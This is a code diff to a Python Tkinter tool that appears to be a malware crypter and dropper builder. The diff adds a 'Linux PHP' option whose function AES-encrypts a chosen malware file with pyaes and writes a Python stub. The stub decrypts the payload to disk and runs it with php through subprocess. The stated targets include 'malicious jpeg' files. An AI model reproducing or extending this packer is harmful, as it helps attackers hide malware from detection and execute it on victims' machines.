@@ -16,6 +16,8 @@ def main():
         pythlin()
     if choices==3:
         jpgwin()
+    if choices == 4:
+        phplin()
     return
 
 def pythwin():
@@ -141,7 +143,46 @@ def jpgwin():
 
     return
 
+def phplin():
+    #windows target with a malicious jpeg file
+    global entry3
+    input2 = entry3.get()
+    # Open file
+    file_name = malwarename  # Malware path
+    new_file_name = input2  # Path to drop file
+    file = open(file_name, "rb")
+    file_data = file.read()
+    file.close()
 
+    # Crypt file data (Using AES)
+    key = bytearray(ran_string, 'UTF-8')  # 16 bytes key - change for your key
+    aes = pyaes.AESModeOfOperationCTR(key)
+    crypto_data = aes.encrypt(file_data)
+
+    # Create Stub in Python File
+    stub = "import pyaes\n"
+    stub += "import sys\n"
+    stub += "crypto_data_hex = " + str(crypto_data) + "\n"
+    stub += "key = " + str(key) + "\n"
+    stub += "new_file_name = \"" + str(new_file_name) + "\"\n"
+    stub += "aes = pyaes.AESModeOfOperationCTR(key)\n"
+    stub += "crypto_data = crypto_data_hex\n"
+    stub += "decrypt_data = aes.decrypt(crypto_data)\n"
+    # Save file
+    stub += "new_file = open(new_file_name, 'wb')\n"
+    stub += "new_file.write(decrypt_data)\n"
+    stub += "new_file.close()\n"
+    # Execute file
+    stub += "import subprocess\n"
+    stub += 'proc = subprocess.Popen("php "+new_file_name, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n'
+
+    # Save the Stub
+    stub_name = str(input2)
+    stub_file = open(stub_name, "w")
+    stub_file.write(stub)
+    stub_file.close()
+
+    return
 def fname():
     #file picker for malicious file
     global malwarename
@@ -188,6 +229,12 @@ def z():
     choices = 3
     return
 
+# PHP for linux
+def a():
+    global choices
+    choices = 4
+    return
+
 #button to select
 menu = Menu(root)
 root.config(menu=menu)
@@ -196,6 +243,7 @@ menu.add_cascade(label="Type of target", menu=subMenu)
 subMenu.add_command(label="Windows Python", command=x)
 subMenu.add_command(label="Linux Python", command=y)
 subMenu.add_command(label="Windows JPEG", command=z)
+subMenu.add_command(label="Linux PHP", command=a)
 # GUI HEADER
 frame = tk.Frame(root, bg='#80C1FF', bd=5)
 frame.place(relx=0.5, rely=0.05, relwidth=1, relheight=0.2, anchor='n')
